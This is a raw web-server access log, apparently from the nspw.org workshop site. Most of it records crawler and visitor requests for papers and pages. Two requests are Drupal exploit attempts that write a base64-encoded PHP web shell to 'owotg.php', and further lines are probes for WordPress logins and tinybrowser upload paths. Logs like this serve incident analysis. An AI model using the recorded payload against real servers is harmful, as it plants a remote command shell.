59.124.153.166 - - [01/May/2018:14:02:48 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6215 "-" "curl/7.47.0"
66.249.73.91 - - [01/May/2018:14:04:54 -0400] "GET /papers/2002/nspw2002-venkatakrishnan.pdf HTTP/1.1" 200 858581 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.91 - - [01/May/2018:14:05:14 -0400] "GET /papers/2011/nspw2011-du.pdf HTTP/1.1" 200 658178 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:14:05:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [01/May/2018:14:05:52 -0400] "GET /papers/2011/nspw2011-hamacher.pdf HTTP/1.1" 200 700592 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.91 - - [01/May/2018:14:07:00 -0400] "GET /proceedings/2006/nspw2006-greenwald.pdf HTTP/1.1" 404 8091 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:14:07:37 -0400] "GET /papers/2012/docs/p87.pdf HTTP/1.1" 200 1631129 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
157.55.39.242 - - [01/May/2018:14:07:18 -0400] "GET /papers/1997/nspw1997-rahman.pdf HTTP/1.1" 200 1078833 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
111.125.208.174 - - [01/May/2018:14:08:16 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
111.125.208.174 - - [01/May/2018:14:08:16 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [01/May/2018:14:08:40 -0400] "GET /2005/PC/xin%20zhao.pdf HTTP/1.1" 404 8022 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
124.104.90.234 - - [01/May/2018:14:09:01 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
124.104.90.234 - - [01/May/2018:14:09:01 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [01/May/2018:14:10:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [01/May/2018:14:11:30 -0400] "GET /2005/PC/mahalingam%20ramkumar.pdf HTTP/1.1" 404 8044 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
43.225.193.10 - - [01/May/2018:14:13:33 -0400] "GET /wp-login.php HTTP/1.1" 404 7907 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
43.225.193.10 - - [01/May/2018:14:13:34 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [01/May/2018:14:13:36 -0400] "GET /papers/1999/nspw1999-olthoff-2.pdf HTTP/1.1" 200 162187 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:14:13:40 -0400] "GET /papers/2010/nspw2010-bratus.pdf HTTP/1.1" 200 457254 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:14:14:07 -0400] "GET /2005/PC/andreas%20gal.pdf HTTP/1.1" 404 8028 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:14:15:20 -0400] "GET /2009/proceedings/1993/nspw1993-hosmer.pdf HTTP/1.1" 200 1025715 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:14:15:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
90.240.59.115 - - [01/May/2018:14:17:08 -0400] "GET /2018/cfp HTTP/1.1" 200 8164 "https://t.co/huVhoRTvmR" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:09 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:09 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1602 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:09 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7529 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:09 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:09 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1182 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:09 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1742 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:09 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 903 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:09 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 505 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:09 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 599 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:09 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 472 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:09 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:09 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:10 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:11 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:11 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:11 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:11 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:11 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:11 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:11 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:11 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:11 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:11 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:24 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 911 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
90.240.59.115 - - [01/May/2018:14:17:24 -0400] "GET /past HTTP/1.1" 200 2993 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
157.55.39.242 - - [01/May/2018:14:17:14 -0400] "GET /papers/1996/nspw1996-hosmer.pdf HTTP/1.1" 200 814756 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [01/May/2018:14:18:27 -0400] "GET /2012/local HTTP/1.1" 200 6657 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:14:19:01 -0400] "GET /2002/pc.content HTTP/1.1" 200 6006 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:14:19:38 -0400] "GET /papers/1999/nspw1999-michael.pdf HTTP/1.1" 200 596878 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [01/May/2018:14:20:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
54.70.40.11 - - [01/May/2018:14:21:29 -0400] "GET /robots.txt HTTP/1.1" 200 4282 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
66.249.73.87 - - [01/May/2018:14:21:58 -0400] "GET /papers/1999/nspw1999-michael.pdf HTTP/1.1" 200 596849 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:14:22:17 -0400] "GET /papers/2012/docs/p87.pdf HTTP/1.1" 200 1631129 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
178.135.82.13 - - [01/May/2018:14:22:26 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
178.135.82.13 - - [01/May/2018:14:22:28 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
128.107.241.180 - - [01/May/2018:14:22:47 -0400] "GET /papers/2006/nspw2006-gates.pdf HTTP/1.1" 200 149513 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
128.107.241.180 - - [01/May/2018:14:23:07 -0400] "-" 408 3408 "-" "-"
40.77.167.208 - - [01/May/2018:14:24:22 -0400] "GET /2009/proceedings/2012/docs/p127.pdf HTTP/1.1" 200 3717088 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [01/May/2018:14:25:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
128.107.241.180 - - [01/May/2018:14:26:24 -0400] "-" 408 156 "-" "-"
128.107.241.180 - - [01/May/2018:14:26:24 -0400] "-" 408 156 "-" "-"
40.77.167.208 - - [01/May/2018:14:26:34 -0400] "GET /2009/proceedings/1993/nspw1993-thuraisingham.pdf HTTP/1.1" 200 531990 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.87 - - [01/May/2018:14:26:51 -0400] "GET /papers/2008/nspw2008-crandall.pdf HTTP/1.1" 200 425114 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
59.124.153.166 - - [01/May/2018:14:28:35 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6214 "-" "curl/7.47.0"
128.29.43.2 - - [01/May/2018:14:28:36 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "https://www.nspw.org/papers/2013/nspw2013-rowe.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
128.29.43.2 - - [01/May/2018:14:28:36 -0400] "GET /papers/2013/nspw2013-rowe.pdf HTTP/1.1" 200 609048 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
66.249.73.91 - - [01/May/2018:14:28:38 -0400] "GET /papers/2006/nspw2006-ford.pdf HTTP/1.1" 200 229478 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:14:29:39 -0400] "GET /2005/cfp/latex/tr.ps HTTP/1.1" 200 738431 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.91 - - [01/May/2018:14:30:21 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:14:30:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.200 - - [01/May/2018:14:30:39 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
65.49.2.177 - - [01/May/2018:14:31:19 -0400] "GET /2006/index.shtml HTTP/1.1" 200 5092 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:31:25 -0400] "GET /2011/dates HTTP/1.1" 200 6248 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:31:32 -0400] "GET /2015/accepted HTTP/1.1" 200 6657 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:31:40 -0400] "GET /2011/sponsors HTTP/1.1" 200 6206 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:31:47 -0400] "GET /2011/program HTTP/1.1" 200 6402 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
85.49.93.57 - - [01/May/2018:14:31:48 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
85.49.93.57 - - [01/May/2018:14:31:48 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
65.49.2.177 - - [01/May/2018:14:31:53 -0400] "GET /2017/dates HTTP/1.1" 200 6168 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:32:00 -0400] "GET /2011/submissions HTTP/1.1" 200 6729 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:32:06 -0400] "GET /2017/organizers HTTP/1.1" 200 6861 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:32:12 -0400] "GET /2017/cfp HTTP/1.1" 200 8717 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:32:17 -0400] "GET /2011/papers HTTP/1.1" 200 6902 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:32:22 -0400] "GET /2011/pc HTTP/1.1" 200 6252 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:32:27 -0400] "GET /2015/location HTTP/1.1" 200 7006 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:32:32 -0400] "GET /2011/cfp HTTP/1.1" 200 8104 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:32:36 -0400] "GET /2015/dates HTTP/1.1" 200 6147 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:32:40 -0400] "GET /2015/sponsors HTTP/1.1" 200 6040 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:32:46 -0400] "GET /2017/location HTTP/1.1" 200 5875 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:32:50 -0400] "GET /2009/finaid.shtml HTTP/1.1" 200 4810 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:32:55 -0400] "GET /past HTTP/1.1" 200 6115 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:33:00 -0400] "GET /2012/2012/local HTTP/1.1" 404 7750 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:33:01 -0400] "GET /2012/cfp HTTP/1.1" 200 7531 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:33:06 -0400] "GET /2009/proceedings.shtml HTTP/1.1" 200 4589 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:33:10 -0400] "GET /2015/organizers HTTP/1.1" 200 6818 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:33:14 -0400] "GET /2009/index.shtml HTTP/1.1" 200 5125 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:33:18 -0400] "GET /2015/program HTTP/1.1" 200 7191 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:33:22 -0400] "GET /2011/local HTTP/1.1" 200 8000 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:33:25 -0400] "GET /2017/accepted HTTP/1.1" 200 6487 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:33:29 -0400] "GET /2011/organizers HTTP/1.1" 200 6460 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [01/May/2018:14:33:33 -0400] "GET /2009/submission.shtml HTTP/1.1" 200 4990 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
111.177.117.36 - - [01/May/2018:14:33:59 -0400] "GET / HTTP/1.1" 200 6520 "-" "-"
69.162.124.227 - - [01/May/2018:14:35:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [01/May/2018:14:35:41 -0400] "GET /node/93 HTTP/1.1" 200 7163 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.87 - - [01/May/2018:14:36:41 -0400] "GET /papers/2013/nspw2013-crane.pdf HTTP/1.1" 200 1891421 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
37.148.145.188 - - [01/May/2018:14:37:40 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
37.148.145.188 - - [01/May/2018:14:37:40 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
35.202.236.114 - - [01/May/2018:14:38:19 -0400] "GET /papers/1993/nspw1993-thuraisingham.pdf HTTP/1.1" 200 531492 "-" "Python/3.5 aiohttp/3.1.3"
66.249.73.87 - - [01/May/2018:14:38:43 -0400] "GET /2018 HTTP/1.1" 200 6908 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:14:39:58 -0400] "GET /papers/2008/nspw2008-bishop.pdf HTTP/1.1" 200 485862 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:14:40:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [01/May/2018:14:41:41 -0400] "GET /papers/2002/nspw2002-marceau.pdf HTTP/1.1" 200 197896 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:14:41:56 -0400] "GET /2009/proceedings/2008/nspw2008-crandall.pdf HTTP/1.1" 200 425114 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.89 - - [01/May/2018:14:42:21 -0400] "GET /2009/proceedings/1994/nspw1994-bertino.pdf HTTP/1.1" 200 542079 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
72.11.140.74 - - [01/May/2018:14:42:50 -0400] "GET /static/js/tiny_mce/plugins/tinybrowser/upload.php?type=file/wp-login.php HTTP/1.1" 404 7910 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
72.11.140.74 - - [01/May/2018:14:42:50 -0400] "GET /admin/lib/tiny_mce/plugins/tinybrowser/upload.php?type=file/wp-login.php HTTP/1.1" 403 5978 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
72.11.140.74 - - [01/May/2018:14:42:50 -0400] "GET /tiny_mce/plugins/tinybrowser/upload.php?type=file/wp-login.php HTTP/1.1" 404 4811 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
72.11.140.74 - - [01/May/2018:14:42:50 -0400] "GET /editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/upload.php?type=file/wp-login.php HTTP/1.1" 404 4890 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
66.102.6.199 - - [01/May/2018:14:44:13 -0400] "GET /papers/2011/nspw2011-pieters.pdf HTTP/1.1" 200 2771026 "http://www.google.com/search" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
39.51.110.207 - - [01/May/2018:14:45:01 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
39.51.110.207 - - [01/May/2018:14:45:02 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [01/May/2018:14:45:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [01/May/2018:14:46:35 -0400] "GET /2009/proceedings/2006/nspw2006-ford.pdf HTTP/1.1" 200 229478 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [01/May/2018:14:46:36 -0400] "GET /2009/proceedings/1998/nspw1998-chang.pdf HTTP/1.1" 200 675732 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
82.18.179.65 - - [01/May/2018:14:46:51 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.18.179.65 - - [01/May/2018:14:46:52 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [01/May/2018:14:47:11 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 712024 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
